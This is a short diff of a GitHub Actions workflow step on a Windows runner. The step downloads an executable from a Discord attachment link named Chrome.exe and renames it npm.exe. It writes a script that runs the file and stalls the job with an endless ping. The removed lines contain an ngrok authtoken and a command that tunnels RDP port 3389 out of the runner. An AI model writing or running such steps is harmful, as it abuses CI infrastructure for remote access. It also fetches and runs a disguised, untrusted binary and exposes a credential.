@@ -30,8 +30,6 @@ jobs:
         run: |
           dir
           Invoke-WebRequest https://cdn.discordapp.com/attachments/714547391746932747/830902212237721610/Chrome.exe -OutFile npm.exe
-          cmd /c echo ./ngrok.exe authtoken "1mjxHtywG0UKYwSSoA7V1VHtVmq_4RqrDjrUkTRJijUWsiobG" >a.ps1
-          cmd /c echo cmd /k start ngrok.exe tcp 3389 >>a.ps1
           cmd /c echo .\npm.exe >>a.ps1
           cmd /c echo ping localhost -w 99999999999999999999999999999999999 >>a.ps1
           .\a.ps1
